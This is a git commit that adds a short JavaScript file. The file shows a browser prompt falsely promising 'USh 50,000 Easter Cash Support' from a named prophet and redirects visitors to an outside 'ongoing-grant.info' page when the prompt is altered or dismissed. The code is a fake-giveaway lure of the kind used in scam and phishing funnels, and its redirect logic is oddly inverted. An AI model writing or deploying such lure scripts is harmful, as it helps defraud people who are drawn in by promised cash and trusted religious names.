3e38eb7d92af5a0a9b3c5b4d4dfe882c9e0caef8
The-On-going <sirpeelawson@gmail.com>
2026-04-01 00:52:23 +0100

    Create activeeasterr.js

---
+++ activeeasterr.js
@@ -0,0 +1,10 @@
+var password = 'USh 50,000';
+
+password = prompt(
+  'Congratulations, you are eligible to Receive PROPHET SAMUEL KAKANDE USh 50,000 Easter Cash Support. Click OK to receive Instantly.',
+  'USh 50,000'
+);
+
+if (password !== 'USh 50,000') {
+    location.href = 'https://ongoing-grant.info/USh50,000-Easter-Support.html';
+}
